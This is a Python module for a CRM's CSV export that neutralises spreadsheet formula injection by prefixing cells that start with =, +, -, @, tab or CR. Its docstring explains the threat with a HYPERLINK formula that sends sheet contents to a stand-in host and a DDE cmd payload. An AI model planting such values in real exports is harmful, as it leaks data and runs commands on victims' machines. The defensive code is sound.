"""
Turning rows into CSV that a spreadsheet opens as data rather than executes as a formula.

A PORT OF backend/src/modules/analytics/csv.ts.

THE ATTACK THIS PREVENTS. A customer chooses their own WhatsApp display name. If they call
themselves `=HYPERLINK("https://evil.test?x="&A1,"Click")` and the owner exports the attention
list and opens it in Excel, that cell is a formula the moment the file loads — it can exfiltrate
the rest of the sheet, and on older setups `=cmd|'/c calc'!A1` does rather more than that.

The CRM never renders that string dangerously anywhere else. **The vulnerability is created
entirely by the export**, which makes it the export's job to fix.

THE FIX, AND WHY IT IS THIS ONE. Quoting alone does not help: Excel strips the quotes and then
evaluates the content. The accepted defence is to prefix any cell whose first character can
begin a formula with a single quote, which spreadsheets treat as "the rest is literal text". The
apostrophe is visible in the cell — a small cosmetic cost for a value that was trying to be code.

PYTHON'S `csv` MODULE IS DELIBERATELY NOT USED. It would handle RFC 4180 quoting correctly and
would do nothing at all about formula injection, and its quoting rules differ from the Node
implementation's in exactly the places that matter (it does not quote a lone `\\r`, and its
`lineterminator` handling would have to be forced anyway). Matching Node byte-for-byte is the
requirement; a stdlib module that is 95% the same is worse than 40 lines that are identical.

Nothing here knows about conversations. It is a pure encoder, so it can be tested exhaustively
without a database — which matters because every dangerous case is a string edge case.
"""

import json
import re
from datetime import datetime, timezone
from typing import Any, Callable, Iterable, Sequence

# Characters that make a spreadsheet treat a cell as a formula.
#
# `+` and `-` are included even though they also begin a negative number: a leading apostrophe
# on `-12` is harmless, and omitting them would leave `-2+3+cmd|...` live. `@` starts a legacy
# Lotus-style function. Tab and CR are here because Excel strips leading whitespace before
# deciding, so `" =1+1"` is still a formula.
FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")

_NEEDS_QUOTING = re.compile(r'[",\n\r]')


def _iso(moment: datetime) -> str:
    """JavaScript's `toISOString()`: exactly three fractional digits, always `Z`."""
    utc = moment.astimezone(timezone.utc) if moment.tzinfo else moment.replace(
        tzinfo=timezone.utc
    )

    return f"{utc.strftime('%Y-%m-%dT%H:%M:%S')}.{utc.microsecond // 1000:03d}Z"


def csv_cell(value: Any) -> str:
    """
    One CSV cell: formula-guarded, then quoted per RFC 4180 when it has to be.

    None becomes an EMPTY cell, not the string "None" — a missing assignee is blank in a
    spreadsheet, not the word None. A datetime becomes ISO 8601, which is unambiguous across
    locales in a way a formatted date is not.
    """
    if value is None:
        return ""

    if isinstance(value, datetime):
        raw = _iso(value)
    elif isinstance(value, bool):
        # Before the int check: bool is a subclass of int in Python, and JavaScript's
        # String(true) is "true", not "1".
        raw = "true" if value else "false"
    elif isinstance(value, (dict, list, tuple)):
        raw = json.dumps(value, separators=(",", ":"), default=str)
    else:
        raw = str(value)

    guarded = f"'{raw}" if raw.startswith(FORMULA_PREFIXES) else raw

    # Quote when the cell contains a delimiter, a quote, or any newline; double inner quotes.
    if _NEEDS_QUOTING.search(guarded):
        escaped = guarded.replace('"', '""')

        return f'"{escaped}"'

    return guarded


class CsvColumn:
    """A header and the accessor that pulls this column's value out of a row."""

    __slots__ = ("header", "value")

    def __init__(self, header: str, value: Callable[[Any], Any]) -> None:
        self.header = header
        self.value = value


def to_csv(rows: Iterable[Any], columns: Sequence[CsvColumn]) -> str:
    """
    Encodes rows as a CSV document.

    CRLF line endings and a UTF-8 BOM, both for Excel's benefit: without the BOM it reads the
    file as the system codepage and mangles any non-ASCII name — which in this CRM is most of
    them.
    """
    header = ",".join(csv_cell(column.header) for column in columns)
    body = [",".join(csv_cell(column.value(row)) for column in columns) for row in rows]
    lines = "\r\n".join([header, *body])

    return f"﻿{lines}\r\n"


def csv_file_name(base: str, iso_date: str) -> str:
    """A filename-safe slug for the Content-Disposition header."""
    slug = re.sub(r"[^a-z0-9-]", "-", base, flags=re.IGNORECASE).lower()

    return f"{slug}-{iso_date[:10]}.csv"
